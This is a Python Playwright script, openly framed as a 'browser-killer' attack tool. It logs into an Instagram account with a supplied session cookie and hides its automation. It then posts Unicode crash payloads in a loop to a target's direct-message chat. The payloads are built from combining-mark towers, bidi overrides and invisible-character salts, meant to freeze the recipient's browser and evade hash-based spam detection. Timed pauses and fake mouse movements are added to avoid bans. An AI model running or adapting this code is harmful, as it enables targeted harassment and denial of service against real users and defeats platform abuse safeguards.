# -*- coding: utf-8 -*-
# 🚀 PROJECT: PRAVEER.OWNS (NATIVE-STRIKE 2026)
# 📅 STATUS: LIBRARY-FREE | 1-ID-SAFE | BROWSER-KILLER

import os, asyncio, random, sys
from playwright.async_api import async_playwright

def get_kernel_stop_payload(target_name):
    """The Ghost-Bypass Edition: Shattered Logic for Desktop Crash."""
    u_id = random.randint(100000, 999999)
    # 🧂 DYNAMIC SALT: Using different invisible characters to break server hashes
    salts = ["\u200b", "\u200c", "\u200d", "\u200e", "\u2060", "\u2063"]
    salt_str = "".join(random.choices(salts, k=12))
    
    # 💥 Header randomization to beat hash-match detection
    headers = [
        f"⚡ 【﻿ ＳＹＳＴＥＭ　ＦＲＥＥＺＥ 】 ⚡",
        f"☣️ 『 𝕯𝕰𝕬𝕿𝕳 𝕾𝕰𝕹𝖀𝕾 』 ☣️",
        f"⚠️ 𝖕𝖗𝖆𝖛𝖊𝖊𝖗.𝖔𝖜𝖓𝖘 ⚠️"
    ]
    header = f"{random.choice(headers)}\n🆔 {u_id}{salt_str}\n"
    
    # 🏗️ OPTIMIZED DENSITY (65 marks is the sweet spot for 2026 delivery)
    z_tower = "̸" * random.randint(55, 65) 
    width_bomb = "\u2800\u00A0" * 30
    lines = [header]
    
    for i in range(85): 
        # BIDI Overrides: Forces the browser's Main Thread to lock
        prefix = "\u202E" if i % 2 == 0 else "\u202D"
        noise = "".join(random.choices("0123456789ABCDEF", k=4))
        lines.append(f"{width_bomb}{prefix}𝕻𝕬𝕻𝕬_{noise}{z_tower}")
        
    return "\n".join(lines)[:9950]

async def agent_blitz(machine_id, cookie_list, target_id, target_name):
    current_cookie = cookie_list[0].strip()

    async with async_playwright() as p:
        # Launch with native stealth flags
        browser = await p.chromium.launch(
            headless=True,
            args=["--disable-blink-features=AutomationControlled"]
        )
        
        # Build clean desktop context
        context = await browser.new_context(
            user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
            viewport={'width': 1920, 'height': 1080},
            extra_http_headers={"Accept-Language": "en-US,en;q=0.9"}
        )
        
        page = await context.new_page()
        
        # Native JS patch to remove 'webdriver' property
        await page.add_init_script("Object.defineProperty(navigator, 'webdriver', {get: () => undefined})")

        try:
            print(f"📡 [M{machine_id}] Establishing Stealth Connection...")
            await page.goto("https://www.instagram.com/robots.txt")
            await context.add_cookies([{
                "name": "sessionid", "value": current_cookie, 
                "domain": ".instagram.com", "path": "/", "secure": True
            }])

            print(f"📡 [M{machine_id}] Loading Target Chat...")
            # We use domcontentloaded to bypass heavy ad-tracker loading
            await page.goto(f"https://www.instagram.com/direct/t/{target_id}/", wait_until="domcontentloaded")
            
            box_selector = "//div[@role='textbox']"
            await page.wait_for_selector(box_selector, timeout=60000)

            while True:
                # 🔥 THE STRIKE
                payload = get_kernel_stop_payload(target_name)
                
                await page.click(box_selector)
                await page.fill(box_selector, payload)
                await asyncio.sleep(random.uniform(3, 5)) 
                await page.keyboard.press("Enter")
                
                print(f"💀 [M{machine_id}] Browser-Killer Delivered. UI Locked.")

                # ⏳ SAFETY GAP (150-180s) to keep 1-ID safe in 2026
                sleep_time = random.uniform(150, 180)
                print(f"⏳ Cooling for {int(sleep_time)}s to bypass server-side ghosting...")
                
                for _ in range(5):
                    await asyncio.sleep(sleep_time / 5)
                    await page.mouse.move(random.randint(0, 500), random.randint(0, 500))

        except Exception as e:
            print(f"❌ [M{machine_id}] Error: {str(e)[:60]}")
            await browser.close()
            sys.exit(1)

if __name__ == "__main__":
    m_id = int(os.environ.get("MACHINE_ID", "1"))
    cookies = os.environ.get("SESSION_ID", "").split(",")
    t_id = os.environ.get("GROUP_URL", "").strip()
    t_name = os.environ.get("TARGET_NAME", "Target").strip()
    
    asyncio.run(agent_blitz(m_id, cookies, t_id, t_name))
